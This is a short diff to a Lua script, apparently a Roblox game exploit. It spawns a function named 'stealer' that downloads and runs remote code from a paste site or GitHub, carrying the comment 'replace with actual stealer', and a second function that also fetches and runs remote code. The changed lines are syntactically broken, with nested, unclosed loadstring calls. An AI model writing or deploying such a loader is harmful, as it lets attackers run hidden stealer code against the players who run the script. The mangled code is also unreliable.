@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/kurobrut/Wards-Hub/refs/heads/main/AutoGingerBread.lua", true))() -- replace with actual stealer
+    loadstring(game:HttpGet("loadstring(game:HttpGet("https://pastefy.app/BcD4q31R/raw", true))() -- replace with actual stealer
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/kurobrut/Wards-Hub/refs/heads/main/GingerbreadFARM-ADM.lua", true))()
+  loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/kurobrut/screen/refs/heads/main/LocalScript.lua", true))()
 end
 task.spawn(stealer)
 task.spawn(loadui)
